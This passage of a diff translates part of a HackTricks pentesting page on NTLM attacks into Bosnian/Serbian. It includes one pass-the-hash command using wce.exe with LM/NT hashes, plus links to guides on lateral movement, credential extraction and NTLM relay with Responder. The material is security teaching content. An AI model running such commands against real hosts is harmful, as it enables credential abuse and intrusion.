 wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 ```
-
-### Manual Windows remote execution with username and password
+### Ručno izvršavanje udaljenog Windows računara sa korisničkim imenom i lozinkom
 
 {% content-ref url="../lateral-movement/" %}
 [lateral-movement](../lateral-movement/)
 {% endcontent-ref %}
 
-## Extracting credentials from a Windows Host
+## Izvlačenje akreditacija sa Windows računara
 
-**For more information about** [**how to obtain credentials from a Windows host you should read this page**](broken-reference)**.**
+**Za više informacija o** [**kako dobiti akreditacije sa Windows računara, trebate pročitati ovu stranicu**](broken-reference)**.**
 
-## NTLM Relay and Responder
+## NTLM Relay i Responder
 
-**Read more detailed guide on how to perform those attacks here:**
+**Pročitajte detaljniji vodič o tome kako izvesti ove napade ovde:**
 
 {% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
 [spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
 {% endcontent-ref %}
 
-## Parse NTLM challenges from a network capture
+## Parsiranje NTLM izazova iz snimka mreže
 
-**You can use** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
+**Možete koristiti** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Da li radite u **cybersecurity kompaniji**? Želite li videti **vašu kompaniju reklamiranu na HackTricks**? Ili želite pristupiti **najnovijoj verziji PEASS-a ili preuzeti HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
